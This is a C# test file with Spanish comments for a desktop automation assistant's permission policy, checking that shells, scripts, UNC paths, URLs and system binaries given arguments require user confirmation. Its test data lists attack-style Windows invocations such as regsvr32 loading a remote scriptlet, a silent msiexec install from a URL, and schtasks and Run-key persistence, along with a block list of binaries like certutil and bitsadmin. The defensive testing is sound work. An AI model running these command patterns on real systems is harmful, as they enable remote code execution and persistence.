using Nexo.Core.Automation;

namespace Nexo.Core.Tests.Characterization;

/// <summary>
/// Fase 1.1.1 — corrige el defecto D2: <c>OpenApplication</c> reenviaba
/// <see cref="AutomationAction.Arguments"/> al proceso mientras estaba clasificada como
/// <see cref="AutomationRiskLevel.Reversible"/>, es decir, sin confirmación.
///
/// Cubre el escenario 22 de `TEST_MATRIX.md` (prueba de seguridad, bloqueante de RC):
/// **abrir una terminal no requiere confirmación; ejecutar un comando dentro de ella sí.**
///
/// Ninguna prueba ejecuta un proceso real: todas evalúan la política tipada.
/// </summary>
public sealed class ShellExecutionPolicyTests
{
    private static AutomationRiskLevel RiskOfOpening(string target, string arguments = "") =>
        AutomationPermissionPolicy.GetRisk(new AutomationAction
        {
            Type = AutomationActionType.OpenApplication,
            Target = target,
            Arguments = arguments
        });

    // ---------- 1. OpenTerminal sin argumentos ----------

    [Fact]
    public void OpenTerminalWithoutArguments_IsAllowed()
    {
        var action = new AutomationAction
        {
            Type = AutomationActionType.OpenTerminal,
            WorkingDirectory = @"C:\Dev"
        };

        Assert.True(AutomationPermissionPolicy.IsAllowed(action, out _));

        // Sigue siendo Sensitive en la ruta de rutinas, como ya ocurría antes de 1.1.1.
        // El ejecutor ignora `Arguments` para este tipo, así que no puede convertirse en
        // ejecución arbitraria.
        Assert.Equal(AutomationRiskLevel.Sensitive, AutomationPermissionPolicy.GetRisk(action));
    }

    // ---------- 2. powershell.exe sin argumentos ----------

    [Theory]
    [InlineData("powershell.exe")]
    [InlineData("powershell")]
    [InlineData("pwsh.exe")]
    [InlineData("cmd.exe")]
    [InlineData("conhost.exe")]
    [InlineData("wt.exe")]
    public void AnInterpreterWithoutArguments_IsJustOpeningIt(string target)
    {
        // Abrir la terminal no es ejecutar en ella: decisión F de PRODUCT_VISION. Restaurada tras la
        // auditoría 2026-09-28; con argumentos sigue siendo Sensitive (ver más abajo).
        Assert.Equal(AutomationRiskLevel.Reversible, RiskOfOpening(target));
    }

    // ---------- 3, 4, 5, 6. Intérpretes con argumentos ----------

    [Theory]
    [InlineData("powershell.exe", "-Command \"Get-Process\"")]
    [InlineData("powershell.exe", "-EncodedCommand SQBuAHYAbwBrAGUA")]
    [InlineData("powershell.exe", "-File script.ps1")]
    [InlineData("pwsh.exe", "-File script.ps1")]
    [InlineData("pwsh", "-c \"ls\"")]
    [InlineData("cmd.exe", "/c dir")]
    [InlineData("cmd", "/k whoami")]
    [InlineData("wscript.exe", "script.vbs")]
    [InlineData("cscript.exe", "//nologo script.vbs")]
    [InlineData("mshta.exe", "javascript:close()")]
    [InlineData("rundll32.exe", "shell32.dll,Control_RunDLL")]
    [InlineData("regsvr32.exe", "/s /u /i:http://ejemplo scrobj.dll")]
    [InlineData("wsl.exe", "-e ls")]
    [InlineData("bash.exe", "-c ls")]
    [InlineData("python.exe", "-c \"print(1)\"")]
    [InlineData("node.exe", "-e \"process.exit()\"")]
    public void AnInterpreterWithArguments_RequiresConfirmation(string target, string arguments)
    {
        Assert.Equal(AutomationRiskLevel.Sensitive, RiskOfOpening(target, arguments));
    }

    // ---------- No basarse solo en el nombre visible ----------

    [Theory]
    [InlineData(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")]
    [InlineData(@"C:/Windows/System32/cmd.exe")]
    [InlineData("\"C:\\Windows\\System32\\cmd.exe\"")]
    [InlineData(@"%SystemRoot%\System32\cmd.exe")]
    [InlineData("POWERSHELL.EXE")]
    [InlineData("  powershell.exe  ")]
    [InlineData("powershell.exe.")]
    [InlineData("powershell.exe ")]
    public void InterpreterDetection_SurvivesPathsQuotesCaseAndTrailingCharacters(string target)
    {
        Assert.True(ShellExecutionPolicy.IsInterpreter(target));
        Assert.Equal(AutomationRiskLevel.Sensitive, RiskOfOpening(target, "-Command \"x\""));
    }

    [Fact]
    public void LaunchingAnInterpreterThroughAnotherProgram_AlsoRequiresConfirmation()
    {
        // Rodeo evidente: el objetivo parece inocuo y el intérprete viaja en los argumentos.
        Assert.Equal(
            AutomationRiskLevel.Sensitive,
            RiskOfOpening("explorer.exe", "powershell -Command \"Get-Process\""));

        Assert.Equal(
            AutomationRiskLevel.Sensitive,
            RiskOfOpening("cualquier.exe", @"C:\Windows\System32\cmd.exe /c dir"));
    }

    [Fact]
    public void QuotedInterpreterPathsInArguments_AreStillDetected()
    {
        Assert.True(ShellExecutionPolicy.MentionsInterpreter(
            "\"C:\\Windows\\System32\\cmd.exe\" /c dir"));
    }

    // ---------- 7. Aplicación normal con argumentos inocuos ----------

    [Theory]
    [InlineData("notepad.exe")]
    [InlineData("spotify.exe")]
    [InlineData("Spotify")]
    [InlineData("code")]
    [InlineData("spotify:")]
    [InlineData("ms-settings:")]
    [InlineData("steam://rungameid/1")]
    [InlineData(@"C:\Program Files\Spotify\Spotify.exe")]
    public void AnOrdinaryApplicationWithoutArguments_StaysReversible(string target)
    {
        // Los atajos de siempre (abrir Spotify, el Bloc de notas) no piden confirmación.
        Assert.Equal(AutomationRiskLevel.Reversible, RiskOfOpening(target));
    }

    [Theory]
    [InlineData("notepad.exe", "notas.txt")]
    [InlineData("code.exe", @"C:\Dev\Nexo")]
    [InlineData("chrome.exe", "https://example.com")]
    [InlineData("chrome.exe", "https://example.com/app.js")]
    [InlineData("chrome.exe", "www.example.com")]
    [InlineData("code", ".")]
    public void AnOrdinaryApplicationWithHarmlessArguments_StaysReversible(
        string target,
        string arguments)
    {
        // Decisión tras la auditoría 2026-09-28: un ejecutable ordinario con argumentos sigue sin
        // pedir confirmación. Las rutinas solo las crea la persona (no hay importación ni creación
        // desde la IA); preguntar cada vez por «abre VS Code en esta carpeta» no protege de nada.
        // Lo peligroso son los binarios de la lista, los scripts, UNC y URL, que sí preguntan.
        Assert.Equal(AutomationRiskLevel.Reversible, RiskOfOpening(target, arguments));
    }

    // ---------- Auditoría 2026-09-28: ejecución que no parecía ejecución ----------

    [Theory]
    [InlineData("forfiles.exe", @"/p C:\Windows /m notepad.exe /c calc.exe")]
    [InlineData("msiexec", "/i https://ejemplo.invalid/a.msi /qn")]
    [InlineData("schtasks.exe", "/create /tn x /tr calc.exe /sc onlogon")]
    [InlineData("reg.exe", @"add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d calc.exe")]
    public void SystemBinariesThatRunOrInstallThings_RequireConfirmation_WithArguments(
        string target,
        string arguments) =>
        Assert.Equal(AutomationRiskLevel.Sensitive, RiskOfOpening(target, arguments));

    [Theory]
    [InlineData("forfiles")]
    [InlineData("msiexec.exe")]
    [InlineData("schtasks")]
    [InlineData("reg")]
    [InlineData("rundll32")]
    [InlineData("regsvr32")]
    [InlineData("mshta")]
    [InlineData("wscript")]
    [InlineData("cscript")]
    [InlineData("certutil")]
    [InlineData("bitsadmin")]
    [InlineData("cmstp")]
    [InlineData("installutil")]
    [InlineData(@"C:\Windows\System32\Forfiles.EXE")]
    [InlineData(@"%SystemRoot%\System32\schtasks.exe")]
    public void SystemBinariesThatRunOrInstallThings_RequireConfirmation_EvenWithoutArguments(string target) =>
        Assert.Equal(AutomationRiskLevel.Sensitive, RiskOfOpening(target));

    [Theory]
    [InlineData(@"C:\Users\yo\Descargas\factura.vbs")]
    [InlineData(@"C:\Users\yo\Descargas\factura.js")]
    [InlineData(@"C:\Users\yo\Descargas\factura.hta")]
    [InlineData("x.bat")]
    [InlineData("x.cmd")]
    [InlineData("x.ps1")]
    [InlineData("x.vbe")]
    [InlineData("x.jse")]
    [InlineData("x.wsf")]
    [InlineData("x.msi")]
    [InlineData("x.scr")]
    [InlineData("x.lnk")]
    [InlineData("x.url")]
    [InlineData("x.reg")]
    [InlineData("X.VBS")]
    [InlineData("\"C:\\a b\\x.vbs\"")]
    [InlineData("x.vbs. ")]
    public void ScriptsInstallersAndShortcuts_RequireConfirmation(string target) =>
        Assert.Equal(AutomationRiskLevel.Sensitive, RiskOfOpening(target));

    [Theory]
    [InlineData(@"\\host\share\x")]
    [InlineData(@"\\host\share\programa.exe")]
    [InlineData("//host/share/x")]
    [InlineData("\"\\\\host\\share\\x\"")]
    public void UncPaths_RequireConfirmation_BecauseTheyLeakTheNtlmHash(string target) =>
        Assert.Equal(AutomationRiskLevel.Sensitive, RiskOfOpening(target));

    [Theory]
    [InlineData("https://ejemplo.invalid/a")]
    [InlineData("http://ejemplo.invalid/a")]
    [InlineData("ftp://ejemplo.invalid/a")]
    [InlineData("file://host/share/a")]
    [InlineData("ms-msdt:/id x")]
    [InlineData("www.ejemplo.invalid")]
    public void Urls_RequireConfirmation(string target) =>
        Assert.Equal(AutomationRiskLevel.Sensitive, RiskOfOpening(target));

    [Fact]
    public void AnOrdinaryApplicationIsNotAnInterpreter()
    {
        Assert.False(ShellExecutionPolicy.IsInterpreter("notepad.exe"));
        Assert.False(ShellExecutionPolicy.IsInterpreter(""));
        Assert.False(ShellExecutionPolicy.IsInterpreter(null));
    }

    [Fact]
    public void WhitespaceOnlyArguments_DoNotCountAsExecution()
    {
        Assert.Equal(AutomationRiskLevel.Reversible, RiskOfOpening("powershell.exe", "   "));
    }

    // ---------- 8. Una rutina no puede encapsular un comando arbitrario ----------

    [Fact]
    public void ARoutineWrappingAShellCommand_RequiresConfirmation()
    {
        var routine = new RoutineDefinition
        {
            Name = "Arranque",
            TriggerPhrase = "modo arranque",
            RequiresConfirmation = false,
            Steps =
            [
                new AutomationAction
                {
                    Type = AutomationActionType.OpenApplication,
                    Target = "powershell.exe",
                    Arguments = "-Command \"Get-Process\""
                }
            ]
        };

        // Antes de 1.1.1 esto devolvía false: la rutina se ejecutaba sin preguntar.
        Assert.True(AutomationPermissionPolicy.RequiresConfirmation(routine));
    }

    [Fact]
    public async Task ARoutineWithAShellCommand_DoesNotRunWithoutExplicitApproval()
    {
        var executor = new RecordingExecutor();
        var runner = new RoutineRunner(executor);
        var routine = ShellRoutine();

        var report = await runner.RunAsync(routine);

        // El permiso se aplica en el ejecutor, no se confía a que la interfaz preguntara.
        Assert.Empty(executor.Executed);
        Assert.Equal(1, report.FailedCount);
        Assert.Contains("Confirmación requerida", report.Results[0].Title);
    }

    [Fact]
    public async Task ARoutineWithAShellCommand_RunsOnlyAfterExplicitApproval()
    {
        var executor = new RecordingExecutor();
        var runner = new RoutineRunner(executor);

        var report = await runner.RunAsync(
            ShellRoutine(),
            RoutineExecutionApproval.ConfirmedByUser);

        Assert.Single(executor.Executed);
        Assert.Equal(1, report.SucceededCount);
    }

    [Fact]
    public async Task ApprovalIsPerExecution_NotStoredOnTheRoutine()
    {
        // Una rutina aprobada una vez no hereda permiso: la siguiente ejecución sin
        // aprobación vuelve a rechazarse.
        var executor = new RecordingExecutor();
        var runner = new RoutineRunner(executor);
        var routine = ShellRoutine();

        await runner.RunAsync(routine, RoutineExecutionApproval.ConfirmedByUser);
        Assert.Single(executor.Executed);

        await runner.RunAsync(routine);

        Assert.Single(executor.Executed);
    }

    [Fact]
    public async Task HarmlessStepsStillRunWithoutApproval()
    {
        // La protección no debe romper las rutinas normales.
        var executor = new RecordingExecutor();
        var runner = new RoutineRunner(executor);
        var routine = new RoutineDefinition
        {
            Name = "Enfoque",
            TriggerPhrase = "modo enfoque",
            Steps =
            [
                new AutomationAction { Type = AutomationActionType.CreateTask, Text = "leer" },
                new AutomationAction { Type = AutomationActionType.StartFocus, NumericValue = 25 }
            ]
        };

        var report = await runner.RunAsync(routine);

        Assert.Equal(2, executor.Executed.Count);
        Assert.Equal(2, report.SucceededCount);
    }

    [Fact]
    public async Task ASensitiveStepIsSkippedButTheRestOfTheRoutineContinues()
    {
        var executor = new RecordingExecutor();
        var runner = new RoutineRunner(executor);
        var routine = new RoutineDefinition
        {
            Name = "Mixta",
            TriggerPhrase = "modo mixto",
            Steps =
            [
                new AutomationAction
                {
                    Type = AutomationActionType.OpenApplication,
                    Target = "cmd.exe",
                    Arguments = "/c dir"
                },
                new AutomationAction { Type = AutomationActionType.CreateTask, Text = "leer" }
            ]
        };

        var report = await runner.RunAsync(routine);

        Assert.Single(executor.Executed);
        Assert.Equal(AutomationActionType.CreateTask, executor.Executed[0].Type);
        Assert.Equal(1, report.FailedCount);
        Assert.Equal(1, report.SucceededCount);
    }

    [Fact]
    public async Task AnExecutorThatThrows_NeverLeaksTheExceptionMessageIntoTheSummary()
    {
        // Auditoría 2026-09-28: el resumen llega al chat y, con un proveedor en la nube, sale del equipo.
        var runner = new RoutineRunner(new ThrowingExecutor());
        var routine = new RoutineDefinition
        {
            Name = "Rota",
            TriggerPhrase = "modo rota",
            Steps = [new AutomationAction { Type = AutomationActionType.CreateTask, Text = "x" }]
        };

        var report = await runner.RunAsync(routine);

        Assert.Equal(1, report.FailedCount);
        Assert.DoesNotContain("adler", report.BuildSummary());
        Assert.DoesNotContain(@"C:\", report.BuildSummary());
    }

    private sealed class ThrowingExecutor : IAutomationActionExecutor
    {
        public Task<AutomationActionResult> ExecuteAsync(
            AutomationAction action,
            CancellationToken cancellationToken) =>
            throw new IOException(@"No se encontró C:\Users\adler\secreto.txt");
    }

    private static RoutineDefinition ShellRoutine() => new()
    {
        Name = "Arranque",
        TriggerPhrase = "modo arranque",
        RequiresConfirmation = false,
        Steps =
        [
            new AutomationAction
            {
                Type = AutomationActionType.OpenApplication,
                Target = "powershell.exe",
                Arguments = "-Command \"Get-Process\""
            }
        ]
    };

    /// <summary>
    /// Ejecutor falso: registra lo que se le pide y nunca lanza un proceso real.
    /// </summary>
    private sealed class RecordingExecutor : IAutomationActionExecutor
    {
        public List<AutomationAction> Executed { get; } = [];

        public Task<AutomationActionResult> ExecuteAsync(
            AutomationAction action,
            CancellationToken cancellationToken)
        {
            Executed.Add(action.Copy());
            return Task.FromResult(
                AutomationActionResult.Completed(action, "Listo", "Acción simulada"));
        }
    }
}
